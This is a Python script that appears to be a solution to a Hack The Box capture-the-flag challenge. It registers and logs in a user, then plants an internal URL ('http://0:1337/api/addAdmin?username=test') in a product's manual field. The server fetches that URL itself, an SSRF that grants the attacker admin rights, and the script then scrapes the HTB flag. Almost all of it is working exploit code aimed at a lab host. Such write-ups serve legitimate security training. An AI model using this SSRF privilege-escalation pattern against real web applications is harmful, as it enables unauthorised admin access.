import requests, re, sys

hostURL = f'http://127.0.0.1:1337'

cookies = {}

def register():
    jData = {'username': 'test', 'password': 'test'}

    req_stat = requests.post(f'{hostURL}/api/register', json=jData).status_code
    if not req_stat == 200:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()

def ssrf_exploit():
    jData = {
        'name': 'admin',
        'price': 'test',
        'description': 'test',
        'manual': 'http://0:1337/api/addAdmin?username=test'
    }

    req_stat = requests.post(f'{hostURL}/api/product', json=jData, cookies=cookies).status_code
    if not req_stat == 200:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()

def login():
    jData = {'username': 'test', 'password': 'test'}

    req_stat = requests.post(f'{hostURL}/api/login', json=jData)
    if not req_stat.status_code == 200:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()
    
    cookies['session'] = req_stat.cookies.get('session')

    dashboard = requests.get(f'{hostURL}/home', cookies=cookies)
    flag = re.findall(r'(HTB\{.*?\})', dashboard.text)
    if flag:
        print(f'[*] Flag: {flag[0]}')


register()
login()
ssrf_exploit()
login()